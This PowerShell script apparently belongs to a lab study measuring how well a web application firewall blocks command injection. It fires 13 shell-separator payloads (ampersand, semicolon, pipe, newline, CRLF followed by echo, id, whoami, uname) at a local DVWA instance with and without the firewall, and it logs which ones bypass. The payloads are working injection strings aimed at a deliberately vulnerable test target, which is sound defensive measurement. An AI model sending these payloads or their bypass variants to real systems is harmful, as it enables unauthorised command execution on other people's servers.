# 04_cmdi.ps1 — graded d for command injection (CWE-78).  [v4]
#
# This script produces results/cmdi_payload_matrix.csv with the same 13 payloads,
# the same columns and the same success detectors as the released reference copy in
# results/reference_outputs/cmdi_payload_matrix.csv. Re-running it on the pinned
# images is expected to reproduce that file; the hit/code values are of course
# whatever your run measures.
#
# TWO PAYLOAD COLUMNS (added in v4 to remove an ambiguity in the v3 release):
#   ip_param        the exact string handed to `curl --data`, i.e. percent-encoded,
#                   because the shell separators and newlines must survive transport.
#   payload_decoded the same payload as the server receives it, for reading; control
#                   characters are shown as the escapes \n and \r\n.
# The v3 reference CSV carried a single column that mixed the two conventions
# (separators decoded, newlines still encoded), which made it look as though the
# script and the CSV disagreed. They did not — only the rendering differed.
#
# Design notes:
#  (1) Per-command success detector:
#        echo  -> unique marker RAAP_CMD_SUCCESS
#        id    -> uid=NNN(  in the response body
#        whoami-> www-data / root
#        uname -> the string "Linux "
#      Each injected command has an explicit success signal, so a "0" means the command did
#      not execute (blocked), not merely that its output was unrecognised.
#  (2) Newline payloads are SINGLE-encoded (%0A / %0D%0A sent raw via --data), so the server
#      receives a real newline, not the literal text "%0A" (the double-encoding bug of v1).
#  (3) Pure-curl session via a cookie jar OR a browser-copied PHPSESSID (see 01b below).
#
# Session: either run 01_login.ps1 first (sets $env:DVWA_SESS), or paste a PHPSESSID that is
# already logged in (from the browser). We use the cookie header directly.

param([string]$sess = $env:DVWA_SESS)

# Render a sent payload the way the server receives it (for the payload_decoded
# column only; the request itself always uses the encoded form in $p.ip).
function Decode-Payload([string]$v) {
  $v -replace '%26','&' -replace '%3B',';' -replace '%7C','|' `
     -replace '%0D%0A','\r\n' -replace '%0A','\n'
}

# --- resolve results dir relative to THIS script (works from any CWD) ---
$RES = Join-Path (Split-Path -Parent $PSScriptRoot) "results"
if (-not (Test-Path $RES)) { New-Item -ItemType Directory -Force -Path $RES | Out-Null }

if (-not $sess) { Write-Host "Set a logged-in PHPSESSID: `$env:DVWA_SESS='...'; or run 01_login.ps1" -ForegroundColor Red; return }
$ck = "PHPSESSID=$sess; security=low"

# quick reachability check
$probe = (curl.exe -s -b $ck "http://localhost:8081/vulnerabilities/exec/") -join " "
if ($probe -notmatch "Command Injection") { Write-Host "exec page not reachable with this session (login first / re-copy cookie)" -ForegroundColor Red; return }

$U = "http://localhost:8081/vulnerabilities/exec/"
$D = "http://localhost:9081/vulnerabilities/exec/"

# 13 payloads — the same set as the released cmdi_payload_matrix.csv.
# ip values are single-encoded so curl --data sends them verbatim to the server.
$ps = @(
  @{l="amp_echo";     ip="127.0.0.1 %26 echo RAAP_CMD_SUCCESS"},
  @{l="semi_echo";    ip="127.0.0.1%3B echo RAAP_CMD_SUCCESS"},
  @{l="pipe_echo";    ip="127.0.0.1 %7C echo RAAP_CMD_SUCCESS"},
  @{l="and_echo";     ip="127.0.0.1 %26%26 echo RAAP_CMD_SUCCESS"},
  @{l="or_echo";      ip="127.0.0.1 %7C%7C echo RAAP_CMD_SUCCESS"},
  @{l="amp_id";       ip="127.0.0.1 %26 id"},
  @{l="semi_id";      ip="127.0.0.1%3B id"},
  @{l="pipe_id";      ip="127.0.0.1 %7C id"},
  @{l="newline_echo"; ip="127.0.0.1%0Aecho RAAP_CMD_SUCCESS"},
  @{l="newline_id";   ip="127.0.0.1%0Aid"},
  @{l="crlf_id";      ip="127.0.0.1%0D%0Aid"},
  @{l="amp_whoami";   ip="127.0.0.1 %26 whoami"},
  @{l="amp_uname";    ip="127.0.0.1 %26 uname -a"}
)

$rows = @()
foreach ($p in $ps) {
  Write-Host "test $($p.l)..." -NoNewline
  $body = "ip=$($p.ip)&Submit=Submit"
  $xu = (curl.exe -s --max-time 8 -b $ck --data $body $U) -join " "
  $hu = if ($xu -match "RAAP_CMD_SUCCESS" -or $xu -match "uid=" -or $xu -match "www-data|root\b" -or $xu -match "Linux ") {1} else {0}
  $cu = 200; if ($xu -match "403 Forbidden") { $cu = 403 }
  $xd = (curl.exe -s --max-time 8 -b $ck --data $body $D) -join " "
  $hd = if ($xd -match "RAAP_CMD_SUCCESS" -or $xd -match "uid=" -or $xd -match "www-data|root\b" -or $xd -match "Linux ") {1} else {0}
  $cd = 200; if ($xd -match "403 Forbidden") { $cd = 403 }
  Write-Host " U=$hu D=$hd"
  $rows += [pscustomobject]@{label=$p.l; ip_param=$p.ip; payload_decoded=(Decode-Payload $p.ip); undef_code=$cu; undef_hit=$hu; def_code=$cd; def_hit=$hd}
}
$rows | Format-Table -AutoSize
$rows | Export-Csv -NoTypeInformation -Encoding UTF8 $RES\cmdi_payload_matrix.csv

# d is computed over the id/echo payloads, which have the most separator coverage and
# unambiguous per-command detectors. whoami/uname are reported separately as controls.
$core = $rows | ?{ $_.label -notlike "*whoami*" -and $_.label -notlike "*uname*" }
$ctrl = $rows | ?{ $_.label -like "*whoami*" -or  $_.label -like "*uname*" }
$nU = ($core | ?{ $_.undef_hit -eq 1 }).Count
$nD = ($core | ?{ $_.def_hit  -eq 1 }).Count
$d  = if ($nU -gt 0) { [math]::Round($nD/$nU, 3) } else { "N/A" }
Write-Host ""
Write-Host "d(CmdInj) = $nD / $nU = $d   (computed over id/echo payloads)" -ForegroundColor Green
Write-Host "Bypassed the WAF (all are id variants):" -ForegroundColor Cyan
$core | ?{ $_.def_hit -eq 1 } | %{ Write-Host "  $($_.label): $($_.payload_decoded)" -ForegroundColor Yellow }
Write-Host ""
Write-Host "Controls (whoami/uname), reported but NOT in d:" -ForegroundColor Cyan
$ctrl | %{ Write-Host "  $($_.label): undef=$($_.undef_hit) def=$($_.def_hit)" -ForegroundColor DarkGray }
Write-Host ""
Write-Host "Per-command detectors: echo->RAAP_CMD_SUCCESS, id->uid=, whoami->www-data/root, uname->Linux." -ForegroundColor DarkGray
